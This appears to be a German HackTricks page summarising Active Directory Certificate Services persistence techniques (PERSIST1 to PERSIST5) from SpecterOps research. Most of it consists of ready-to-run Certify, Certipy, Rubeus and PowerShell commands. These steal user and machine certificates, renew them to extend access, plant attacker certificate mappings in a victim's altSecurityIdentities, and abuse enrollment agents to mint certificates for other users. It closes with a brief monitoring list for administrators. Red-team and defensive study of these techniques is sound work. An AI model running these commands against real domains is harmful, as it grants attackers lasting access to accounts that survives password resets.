# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine kleine Zusammenfassung der Kapitel zur Kontinuität von Konten aus der großartigen Forschung von [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verständnis des Diebstahls aktiver Benutzeranmeldeinformationen mit Zertifikaten – PERSIST1

In einem Szenario, in dem ein Zertifikat, das die Domänenauthentifizierung ermöglicht, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Zertifikat anzufordern und zu stehlen, um die Persistenz in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt die `User`-Vorlage in Active Directory solche Anfragen, obwohl sie manchmal deaktiviert sein kann.

Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) können Sie nach aktivierten Vorlagen suchen, die die Clientauthentifizierung ermöglichen, und dann eine anfordern:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die Macht eines Zertifikats liegt in seiner Fähigkeit, sich als der Benutzer zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.

Sie können PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht die zertifikatsbasierte Authentifizierung einen dauerhaften Zugriff, ohne LSASS zu berühren und sogar aus nicht erhöhten Kontexten.

## Erreichen von Maschinenpersistenz mit Zertifikaten - PERSIST2

Wenn ein Angreifer erhöhte Berechtigungen auf einem Host hat, kann er das Maschinenkonto des kompromittierten Systems mit dem Standard-`Machine`-Template für ein Zertifikat registrieren. Die Authentifizierung als Maschine ermöglicht S4U2Self für lokale Dienste und kann eine dauerhafte Maschinenpersistenz bieten:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Der Missbrauch der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff zu behalten. Wenn Sie ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzen, können Sie es vor Ablauf erneuern, um ein frisches, langlebiges Credential zu erhalten, ohne zusätzliche Anforderungsartefakte zu hinterlassen, die mit dem ursprünglichen Prinzipal verbunden sind.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Betrieblicher Tipp: Verfolgen Sie die Laufzeiten von von Angreifern gehaltenen PFX-Dateien und erneuern Sie diese frühzeitig. Eine Erneuerung kann auch dazu führen, dass aktualisierte Zertifikate die moderne SID-Mapping-Erweiterung enthalten, wodurch sie unter strengeren DC-Mapping-Regeln verwendbar bleiben (siehe nächster Abschnitt).

## Pflanzung expliziter Zertifikat-Mappings (altSecurityIdentities) – PERSIST4

Wenn Sie auf das Attribut `altSecurityIdentities` eines Zielkontos schreiben können, können Sie ein von einem Angreifer kontrolliertes Zertifikat explizit diesem Konto zuordnen. Dies bleibt auch nach Passwortänderungen bestehen und bleibt bei Verwendung starker Mapping-Formate unter der modernen DC-Durchsetzung funktionsfähig.

Hochrangiger Ablauf:

1. Erhalten oder stellen Sie ein Client-Auth-Zertifikat aus, das Sie kontrollieren (z. B. melden Sie sich mit der `User`-Vorlage als sich selbst an).
2. Extrahieren Sie einen starken Identifikator aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
3. Fügen Sie eine explizite Zuordnung im `altSecurityIdentities` des Opfers mit diesem Identifikator hinzu.
4. Authentifizieren Sie sich mit Ihrem Zertifikat; der DC ordnet es über die explizite Zuordnung dem Opfer zu.

Beispiel (PowerShell) mit einer starken Issuer+Serial-Zuordnung:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dann authentifizieren Sie sich mit Ihrem PFX. Certipy wird ein TGT direkt abrufen:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notizen
- Verwenden Sie nur starke Mapping-Typen: X509IssuerSerialNumber, X509SKI oder X509SHA1PublicKey. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch die DC-Richtlinie blockiert werden.
- Die Zertifikatskette muss zu einem von der DC vertrauenswürdigen Root führen. Unternehmens-CAs in NTAuth sind typischerweise vertrauenswürdig; einige Umgebungen vertrauen auch öffentlichen CAs.

Für weitere Informationen zu schwachen expliziten Zuordnungen und Angriffswegen siehe:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent als Persistenz – PERSIST5

Wenn Sie ein gültiges Zertifikat für einen Certificate Request Agent/Enrollment Agent erhalten, können Sie nach Belieben neue, anmeldefähige Zertifikate im Namen von Benutzern erstellen und den Agenten-PFX offline als Persistenz-Token aufbewahren. Missbrauchs-Workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Die Widerrufung des Agentenzertifikats oder der Berechtigungen für Vorlagen ist erforderlich, um diese Persistenz zu beseitigen.

## 2025 Starke Durchsetzung der Zertifikatzuordnung: Auswirkungen auf die Persistenz

Microsoft KB5014754 führte die starke Durchsetzung der Zertifikatzuordnung auf Domänencontrollern ein. Seit dem 11. Februar 2025 verwenden DCs standardmäßig die vollständige Durchsetzung und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:

- Zertifikate vor 2022, die die SID-Zuordnungs-Erweiterung nicht haben, können bei vollständiger Durchsetzung durch DCs an der impliziten Zuordnung scheitern. Angreifer können den Zugriff aufrechterhalten, indem sie entweder Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) einfügen.
- Explizite Zuordnungen mit starken Formaten (Issuer+Serial, SKI, SHA1-PublicKey) funktionieren weiterhin. Schwache Formate (Issuer/Subject, nur Subject, RFC822) können blockiert werden und sollten für die Persistenz vermieden werden.

Administratoren sollten überwachen und alarmieren bei:
- Änderungen an `altSecurityIdentities` und der Ausstellung/Erneuerung von Enrollment-Agent- und Benutzerzertifikaten.
- CA-Ausgabeverzeichnissen für Anfragen im Namen von und ungewöhnliche Erneuerungsmuster.

## Referenzen

- Microsoft. KB5014754: Änderungen bei der zertifikatbasierten Authentifizierung auf Windows-Domänencontrollern (Durchsetzungszeitplan und starke Zuordnungen).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Befehlsreferenz (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
